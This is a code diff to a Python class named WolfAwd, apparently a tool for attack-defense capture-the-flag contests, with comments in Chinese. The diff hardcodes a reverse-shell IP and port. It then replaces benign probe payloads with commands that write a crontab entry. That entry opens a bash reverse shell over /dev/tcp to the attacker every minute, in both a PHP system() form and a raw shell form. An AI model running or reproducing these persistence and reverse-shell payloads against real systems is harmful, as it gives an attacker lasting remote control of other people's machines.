@@ -8,6 +8,8 @@ class WolfAwd():
     def __init__(self):
         #　数据库会话
         self.session = database_init()
+        self.reverse_shell_ip = '192.168.0.102'
+        self.reverse_shell_port = 7777
 
 
     def run(self, global_config):
@@ -30,8 +32,10 @@ class WolfAwd():
         后期拼接ip执行反弹shell
         """
         self.data = {
-            "getwebshell": "phpinfo",
-            "getosshell": "id",
+            "getwebshell": r"""system('echo "*/1 * * * * bash -c \'bash -i >/dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1\';" |crontab');""".format(
+            reverse_shell_ip=self.reverse_shell_ip, reverse_shell_port=self.reverse_shell_port),
+            "getosshell": r"""echo "*/1 * * * * bash -c 'bash -i >/dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1';" |crontab""".format(
+            reverse_shell_ip=self.reverse_shell_ip, reverse_shell_port=self.reverse_shell_port)
         }
 
         self.common_views.show()
